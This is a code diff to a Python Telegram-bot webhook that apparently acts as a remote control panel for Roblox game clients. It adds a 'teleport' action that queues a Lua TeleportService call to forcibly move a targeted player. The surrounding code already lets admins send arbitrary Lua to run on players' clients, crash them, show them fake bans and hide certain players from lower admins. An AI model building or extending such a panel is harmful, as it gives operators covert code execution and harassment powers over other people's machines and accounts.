@@ -21,8 +21,8 @@ SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') 
 TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
 # === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
-# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash
-SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset')
+# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport
+SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport')
 SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]
 
 # === СПИСОК СКРЫТЫХ ИГРОКОВ (ВИДЯТ ТОЛЬКО FULL_ADMINS) ===
@@ -106,6 +106,7 @@ awaiting_reason = {}
 awaiting_msg_text = {}
 awaiting_msg_duration = {}
 awaiting_execute = {}
+awaiting_teleport = {}
 last_seen = {}
 player_places = {}
 
@@ -257,7 +258,7 @@ def telegram_webhook():
                 return jsonify({"status": "hidden_player_denied"})
             
             # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
-            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267"]
+            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport"]
             if btn_action in protected_actions:
                 if not is_full_admin and btn_action not in SEMI_PERMS:
                     answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
@@ -269,6 +270,7 @@ def telegram_webhook():
                 awaiting_execute.pop(user_id, None)
                 awaiting_msg_text.pop(user_id, None)
                 awaiting_msg_duration.pop(user_id, None)
+                awaiting_teleport.pop(user_id, None)
 
                 def can_use(action):
                     return is_full_admin or action in SEMI_PERMS
@@ -280,6 +282,9 @@ def telegram_webhook():
                     
                 if can_use("execselect"):
                     keyboard_layout.append([{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}])
+
+                if can_use("teleport"):
+                    keyboard_layout.append([{"text": "🚀 Teleport", "callback_data": f"teleport_{target_user}"}])
 
                 row2 = []
                 if can_use("freeze"): row2.append({"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"})
@@ -321,6 +326,10 @@ def telegram_webhook():
                 awaiting_execute[user_id] = target_user
                 send_telegram_message(chat_id, f"✍️ Отправь мне Lua-код для выполнения на клиенте <b>{target_user}</b>:", parse_mode="HTML")
             
+            elif btn_action == "teleport":
+                awaiting_teleport[user_id] = target_user
+                send_telegram_message(chat_id, f"🚀 Отправь мне <b>Place ID</b> игры, куда нужно отправить <b>{target_user}</b> (только цифры):", parse_mode="HTML")
+
             elif btn_action == "message":
                 awaiting_msg_text[user_id] = target_user
                 send_telegram_message(chat_id, f"✍️ Отправь мне текст сообщения для игрока <b>{target_user}</b>:", parse_mode="HTML")
@@ -407,6 +416,23 @@ def telegram_webhook():
             if target_user not in commands_queue: commands_queue[target_user] = []
             commands_queue[target_user].append(action)
             send_telegram_message(chat_id, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
+
+        elif user_id in awaiting_teleport:
+            target_user = awaiting_teleport.pop(user_id)
+            try:
+                # Проверяем, что ввели именно числа
+                place_id = int(text.strip())
+                
+                # Твой скрипт, сжатый в 1 строчку
+                lua_code = f"game:GetService('TeleportService'):Teleport({place_id}, game.Players.LocalPlayer)"
+                action = f"/execute__{lua_code}"
+                
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                
+                send_telegram_message(chat_id, f"✅ Игрок {target_user} принудительно отправлен в плейс <code>{place_id}</code>!", parse_mode="HTML")
+            except ValueError:
+                send_telegram_message(chat_id, "⚠️ Ошибка: Place ID должен состоять только из цифр. Открой профиль и попробуй снова.")
 
         elif user_id in awaiting_msg_text:
             target_user = awaiting_msg_text.pop(user_id)
